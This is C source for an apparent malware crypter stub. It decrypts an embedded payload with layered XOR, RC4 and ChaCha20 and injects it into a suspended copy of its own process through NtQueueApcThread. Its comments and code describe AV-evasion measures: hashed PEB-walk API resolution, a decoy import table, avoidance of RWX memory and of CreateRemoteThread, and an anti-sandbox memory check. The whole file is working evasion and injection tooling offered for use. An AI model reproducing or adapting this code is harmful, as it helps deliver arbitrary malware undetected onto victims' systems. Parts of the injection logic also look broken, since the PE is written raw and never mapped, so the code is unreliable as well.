/*
 * Stub Runner - In-memory PE execution with evasion
 * - No suspicious static imports (PEB walk for all APIs)
 * - NtQueueApcThread instead of CreateRemoteThread
 * - RW->RX memory (no RWX)
 * - Decoy IAT with benign imports
 */

// Decoy imports - make IAT look like a normal app
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <time.h>

// Embedded payload
extern unsigned char _binary_payload_bin_start[];

#ifndef PASSWORD
#define PASSWORD "default_password"
#endif
#ifndef PAYLOAD_SIZE
#define PAYLOAD_SIZE 0
#endif
#ifndef ENCRYPTION_LEVEL
#define ENCRYPTION_LEVEL 3
#endif

// ============================================================================
// PEB Walk - resolve APIs without GetProcAddress in IAT
// ============================================================================

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA;

typedef struct _PEB {
    BYTE           Reserved1[2];
    BYTE           BeingDebugged;
    BYTE           Reserved2[1];
    PVOID          Reserved3[2];
    PEB_LDR_DATA*  Ldr;
} PEB;

// DJB2 hash for API name matching
static uint32_t djb2(const char* s) {
    uint32_t h = 5381;
    while (*s) h = ((h << 5) + h) ^ (uint8_t)*s++;
    return h;
}

// Walk PEB to find a DLL base by name hash
static PVOID peb_get_module(uint32_t name_hash) {
    PEB* peb;
#ifdef _WIN64
    peb = (PEB*)__readgsqword(0x60);
#else
    peb = (PEB*)__readfsdword(0x30);
#endif
    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* cur  = head->Flink;
    while (cur != head) {
        LDR_DATA_TABLE_ENTRY* e = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (e->BaseDllName.Buffer) {
            // Convert wide name to narrow for hashing
            char narrow[64] = {0};
            int i;
            for (i = 0; i < 63 && e->BaseDllName.Buffer[i]; i++)
                narrow[i] = (char)(e->BaseDllName.Buffer[i] | 0x20); // lowercase
            if (djb2(narrow) == name_hash)
                return e->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}

// Walk EAT to find export by name hash
static PVOID get_export(PVOID base, uint32_t fn_hash) {
    uint8_t* b = (uint8_t*)base;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)b;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(b + dos->e_lfanew);
    DWORD eat_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!eat_rva) return NULL;

    IMAGE_EXPORT_DIRECTORY* eat = (IMAGE_EXPORT_DIRECTORY*)(b + eat_rva);
    DWORD* names    = (DWORD*)(b + eat->AddressOfNames);
    WORD*  ords     = (WORD*) (b + eat->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)(b + eat->AddressOfFunctions);

    for (DWORD i = 0; i < eat->NumberOfNames; i++) {
        const char* name = (const char*)(b + names[i]);
        if (djb2(name) == fn_hash)
            return (PVOID)(b + funcs[ords[i]]);
    }
    return NULL;
}

// Pre-computed djb2 hashes (lowercase dll name / exact function name)
#define H_KERNEL32                          0x3e003875UL
#define H_NTDLL                             0xe91aad51UL

#define H_VirtualAlloc                      0x19fbbf49UL
#define H_VirtualFree                       0x0888e730UL
#define H_VirtualProtect                    0x17ea484fUL
#define H_WriteProcessMemory                0xcf9e4312UL
#define H_CreateProcessA                    0x5768c90bUL
#define H_ResumeThread                      0xe88ec572UL
#define H_CloseHandle                       0x687c0d79UL
#define H_GetModuleFileNameA                0xe60575e9UL
#define H_GlobalMemoryStatusEx              0xaf9daf66UL
#define H_NtAllocateVirtualMemory           0xf0146ce2UL
#define H_NtProtectVirtualMemory            0xcd363694UL
#define H_NtQueueApcThread                  0x4d230412UL
#define H_NtResumeThread                    0xdae08088UL

// Resolve at runtime - called once, cached
typedef LPVOID  (WINAPI *pVirtualAlloc_t)(LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL    (WINAPI *pVirtualFree_t)(LPVOID,SIZE_T,DWORD);
typedef BOOL    (WINAPI *pVirtualProtect_t)(LPVOID,SIZE_T,DWORD,PDWORD);
typedef BOOL    (WINAPI *pWriteProcessMemory_t)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
typedef BOOL    (WINAPI *pCreateProcessA_t)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef DWORD   (WINAPI *pResumeThread_t)(HANDLE);
typedef BOOL    (WINAPI *pCloseHandle_t)(HANDLE);
typedef DWORD   (WINAPI *pGetModuleFileNameA_t)(HMODULE,LPSTR,DWORD);
typedef BOOL    (WINAPI *pGlobalMemoryStatusEx_t)(LPMEMORYSTATUSEX);
typedef NTSTATUS(NTAPI *pNtAllocateVirtualMemory_t)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
typedef NTSTATUS(NTAPI *pNtProtectVirtualMemory_t)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
typedef NTSTATUS(NTAPI *pNtQueueApcThread_t)(HANDLE,PVOID,PVOID,PVOID,PVOID);
typedef NTSTATUS(NTAPI *pNtResumeThread_t)(HANDLE,PULONG);

static struct {
    pVirtualAlloc_t           VirtualAlloc;
    pVirtualFree_t            VirtualFree;
    pVirtualProtect_t         VirtualProtect;
    pWriteProcessMemory_t     WriteProcessMemory;
    pCreateProcessA_t         CreateProcessA;
    pResumeThread_t           ResumeThread;
    pCloseHandle_t            CloseHandle;
    pGetModuleFileNameA_t     GetModuleFileNameA;
    pGlobalMemoryStatusEx_t   GlobalMemoryStatusEx;
    pNtAllocateVirtualMemory_t NtAllocateVirtualMemory;
    pNtProtectVirtualMemory_t  NtProtectVirtualMemory;
    pNtQueueApcThread_t        NtQueueApcThread;
    pNtResumeThread_t          NtResumeThread;
} api;

static void resolve_apis(void) {
    PVOID k32   = peb_get_module(H_KERNEL32);
    PVOID ntdll = peb_get_module(H_NTDLL);

    api.VirtualAlloc          = get_export(k32,   H_VirtualAlloc);
    api.VirtualFree           = get_export(k32,   H_VirtualFree);
    api.VirtualProtect        = get_export(k32,   H_VirtualProtect);
    api.WriteProcessMemory    = get_export(k32,   H_WriteProcessMemory);
    api.CreateProcessA        = get_export(k32,   H_CreateProcessA);
    api.ResumeThread          = get_export(k32,   H_ResumeThread);
    api.CloseHandle           = get_export(k32,   H_CloseHandle);
    api.GetModuleFileNameA    = get_export(k32,   H_GetModuleFileNameA);
    api.GlobalMemoryStatusEx  = get_export(k32,   H_GlobalMemoryStatusEx);
    api.NtAllocateVirtualMemory = get_export(ntdll, H_NtAllocateVirtualMemory);
    api.NtProtectVirtualMemory  = get_export(ntdll, H_NtProtectVirtualMemory);
    api.NtQueueApcThread        = get_export(ntdll, H_NtQueueApcThread);
    api.NtResumeThread          = get_export(ntdll, H_NtResumeThread);
}

// ============================================================================
// Assembly encryption functions (from .obj files)
// ============================================================================

extern void xor_crypt_rotating(uint8_t* out, uint8_t* in, size_t len);
extern void rc4_init(uint8_t* state, uint8_t* key, size_t keylen);
extern void rc4_crypt(uint8_t* state, uint8_t* in, uint8_t* out, size_t len);
extern void chacha20_encrypt(uint8_t* out, uint8_t* in, size_t len, uint8_t* key, uint8_t* nonce);

// ============================================================================
// Key derivation
// ============================================================================

static void derive_keys(const char* password, uint8_t* xor_key, uint8_t* rc4_key,
                        uint8_t* chacha_key, uint8_t* nonce) {
    const char* salt = "xorcrypt";
    size_t plen = strlen(password);
    size_t slen = strlen(salt);
    uint8_t temp[64];
    for (int i = 0; i < 64; i++)
        temp[i] = password[i % plen] ^ salt[i % slen] ^ (i * 0x5A);
    for (int round = 0; round < 1000; round++)
        for (int i = 0; i < 64; i++)
            temp[i] ^= (temp[(i + 1) % 64] + round) & 0xFF;
    memcpy(xor_key,    temp,      8);
    memcpy(rc4_key,    temp + 8,  16);
    memcpy(chacha_key, temp + 24, 32);
    memcpy(nonce,      temp + 56, 8);
    nonce[8]  = nonce[0] ^ nonce[4];
    nonce[9]  = nonce[1] ^ nonce[5];
    nonce[10] = nonce[2] ^ nonce[6];
    nonce[11] = nonce[3] ^ nonce[7];
}

// ============================================================================
// Decryption
// ============================================================================

static int decrypt_payload(uint8_t* data, size_t len, const char* password, int level) {
    if (len < 28) return 0;
    uint8_t xor_key[8], rc4_key[16], chacha_key[32], nonce[12];
    derive_keys(password, xor_key, rc4_key, chacha_key, nonce);

    size_t offset = 0;
    if (level >= 6 && len >= 8 && memcmp(data, "SELFMOD\x00", 8) == 0) offset += 8;
    if (level >= 5 && len >= offset + 8 && memcmp(data + offset, "MEMFLUC\x00", 8) == 0) offset += 8;
    if (level >= 3 && len >= offset + 12) { memcpy(nonce, data + offset, 12); offset += 12; }

    uint8_t* enc = data + offset;
    size_t enc_len = len - offset - 16;

    switch (level) {
        case 1:
            xor_crypt_rotating(enc, enc, enc_len);
            break;
        case 2: {
            uint8_t s[256]; rc4_init(s, rc4_key, 16);
            rc4_crypt(s, enc, enc, enc_len);
            xor_crypt_rotating(enc, enc, enc_len);
            break;
        }
        default: {
            chacha20_encrypt(enc, enc, enc_len, chacha_key, nonce);
            uint8_t s[256]; rc4_init(s, rc4_key, 16);
            rc4_crypt(s, enc, enc, enc_len);
            xor_crypt_rotating(enc, enc, enc_len);
            break;
        }
    }
    return 1;
}

// ============================================================================
// In-memory PE execution via NtQueueApcThread (avoids CreateRemoteThread)
// ============================================================================

static int execute_pe_memory(uint8_t* pe_data, size_t pe_size) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe_data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(pe_data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    char cmd[MAX_PATH];
    api.GetModuleFileNameA(NULL, cmd, MAX_PATH);

    if (!api.CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                            CREATE_SUSPENDED | CREATE_NO_WINDOW,
                            NULL, NULL, &si, &pi))
        return 0;

    // Allocate RW in target
    PVOID base = NULL;
    SIZE_T size = pe_size;
    NTSTATUS st = api.NtAllocateVirtualMemory(
        pi.hProcess, &base, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (st != 0) { TerminateProcess(pi.hProcess, 1); goto cleanup; }

    api.WriteProcessMemory(pi.hProcess, base, pe_data, pe_size, NULL);

    // RW -> RX (no RWX)
    ULONG old;
    api.NtProtectVirtualMemory(pi.hProcess, &base, &size, PAGE_EXECUTE_READ, &old);

    // Queue APC on the suspended main thread (avoids CreateRemoteThread signature)
    api.NtQueueApcThread(pi.hThread, (PVOID)base, NULL, NULL, NULL);

    // Resume via NtResumeThread
    ULONG prev;
    api.NtResumeThread(pi.hThread, &prev);

    api.CloseHandle(pi.hThread);
    api.CloseHandle(pi.hProcess);
    return 1;

cleanup:
    api.CloseHandle(pi.hThread);
    api.CloseHandle(pi.hProcess);
    return 0;
}

// ============================================================================
// Entry point
// ============================================================================

int main(void) {
    // Resolve all APIs via PEB walk - nothing suspicious in IAT
    resolve_apis();

    // Anti-sandbox: require >= 2GB RAM
    MEMORYSTATUSEX mem = {0};
    mem.dwLength = sizeof(mem);
    api.GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024))
        return 0;

    size_t payload_size = PAYLOAD_SIZE;
    if (payload_size < 28) return 1;

    uint8_t* data = (uint8_t*)api.VirtualAlloc(
        NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!data) return 1;

    memcpy(data, _binary_payload_bin_start, payload_size);

    if (!decrypt_payload(data, payload_size, PASSWORD, ENCRYPTION_LEVEL)) {
        api.VirtualFree(data, 0, MEM_RELEASE);
        return 1;
    }

    // Advance past markers/nonce/hmac to real PE
    uint8_t* pe = data;
    size_t   pe_sz = payload_size;

    if (ENCRYPTION_LEVEL >= 6 && memcmp(pe, "SELFMOD\x00", 8) == 0) { pe += 8; pe_sz -= 8; }
    if (ENCRYPTION_LEVEL >= 5 && memcmp(pe, "MEMFLUC\x00", 8) == 0) { pe += 8; pe_sz -= 8; }
    if (ENCRYPTION_LEVEL >= 3) { pe += 12; pe_sz -= 12; }
    pe_sz -= 16; // HMAC

    int result = execute_pe_memory(pe, pe_sz);

    memset(data, 0, payload_size);
    api.VirtualFree(data, 0, MEM_RELEASE);
    return result ? 0 : 1;
}
